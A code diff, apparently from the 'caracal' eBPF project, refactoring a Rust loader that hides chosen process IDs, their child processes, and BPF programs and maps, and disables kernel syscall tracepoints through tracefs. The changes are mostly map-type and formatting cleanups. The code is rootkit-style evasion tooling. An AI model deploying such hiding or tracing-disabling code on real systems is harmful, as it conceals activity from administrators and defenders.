@@ -1,14 +1,11 @@
 use std::{thread, time::Duration};
 
-use aya::{
-    maps::{Array, HashMap},
-    EbpfLoader,
-};
+use aya::{maps::HashMap, EbpfLoader};
 use caracal::utils::{
     fetch_progs_ids_map_ids, get_descendants, get_progs_info_from_progs_ids, list_active_maps,
-    list_active_programs, write_to_tracefs, Builder, HiddenPid, SyscallTracepoint,
+    list_active_programs, write_to_tracefs, Builder, SyscallTracepoint,
 };
-use caracal_common::MAX_BPF_OBJ;
+use caracal_common::{MAX_BPF_OBJ, MAX_HIDDEN_PIDS};
 use clap::Parser;
 use log::{debug, info, warn};
 use sysinfo::{Pid, ProcessesToUpdate, System};
@@ -17,7 +14,7 @@ use tokio::signal;
 #[derive(Debug, Parser)]
 struct Opt {
     #[clap(long, value_delimiter = ',', required = true)]
-    pid: Vec<String>,
+    pid: Vec<u32>,
     #[clap(long, value_delimiter = ',', required = false)]
     bpf_prog_id: Vec<u32>,
 }
@@ -38,7 +35,7 @@ async fn main() -> anyhow::Result<()> {
     };
     let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
     if ret != 0 {
-        debug!("remove limit on locked memory failed, ret is: {}", ret);
+        debug!("remove limit on locked memory failed, ret is: {ret}");
     }
 
     let tracepoints = vec![
@@ -51,7 +48,7 @@ async fn main() -> anyhow::Result<()> {
         "../../target/bpfel-unknown-none/release/caracal"
     ))?;
     if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
-        warn!("failed to initialize eBPF logger: {}", e);
+        warn!("failed to initialize eBPF logger: {e}");
     }
     let mut builder = Builder {
         ebpf: &mut ebpf,
@@ -67,8 +64,8 @@ async fn main() -> anyhow::Result<()> {
     let full_bpf_info = fetch_progs_ids_map_ids(bpf_progs_info)?;
 
     // setup HIDDEN_PIDS MAP
-    let mut hidden_pids_array: Array<_, HiddenPid> =
-        Array::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
+    let mut hidden_pids_map: HashMap<_, u32, u8> =
+        HashMap::try_from(ebpf.take_map("HIDDEN_PIDS").unwrap()).unwrap();
 
     // setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
     let mut hidden_obj_map: HashMap<_, u32, [u32; MAX_BPF_OBJ as usize]> =
@@ -93,10 +90,10 @@ async fn main() -> anyhow::Result<()> {
     let map_ids = full_bpf_info.map_ids;
 
     for p in prog_ids.clone() {
-        info!("bpf prog: {} -> hide", p)
+        info!("bpf prog: {p} -> hide")
     }
     for m in map_ids.clone() {
-        info!("bpf  map: {} -> hide", m)
+        info!("bpf  map: {m} -> hide")
     }
 
     // keep skip-maps updated
@@ -161,22 +158,23 @@ async fn main() -> anyhow::Result<()> {
     // setup pid trees to hide
     let mut sys = System::new_all();
     let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
-    let mut idx = 0u32;
+
     for p in pid.iter() {
-        hidden_pids_array.set(idx, HiddenPid::new(p), 0).unwrap();
-        info!("pid: {} -> hide", p);
-        idx += 1;
-        let children = get_descendants(&sys, Pid::from(p.parse::<usize>().unwrap()));
+        info!("pid: {p} -> hide");
+        hidden_pids_map
+            .insert(p, 0, 0)
+            .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
+        let children = get_descendants(&sys, Pid::from(*p as usize));
         for child in children.iter() {
             if let Some(task) = sys.process(*child) {
                 info!("pid: {} -> hide child: {} [{:?}]", p, child, task.name());
             } else {
-                info!("pid: {} -> hide child: {}", p, child);
+                info!("pid: {p} -> hide child: {child}");
             }
-            hidden_pids_array
-                .set(idx, HiddenPid::new(&child.to_string()), 0)
-                .unwrap();
-            idx += 1;
+            info!("{}", child.as_u32());
+            hidden_pids_map
+                .insert(child.as_u32(), 0, 0)
+                .unwrap_or_else(|_| panic!("TOO MANY PIDS PROVIDED (max {MAX_HIDDEN_PIDS})"));
         }
     }
 
@@ -189,11 +187,10 @@ async fn main() -> anyhow::Result<()> {
                     if let Err(err) = write_to_tracefs(
                         "0",
                         &format!(
-                            "/sys/kernel/debug/tracing/events/syscalls/sys_{}_{}/enable",
-                            hook, syscall
+                            "/sys/kernel/debug/tracing/events/syscalls/sys_{hook}_{syscall}/enable",
                         ),
                     ) {
-                        println!("error: {}", err);
+                        println!("error: {err}");
                     };
                 }
             }
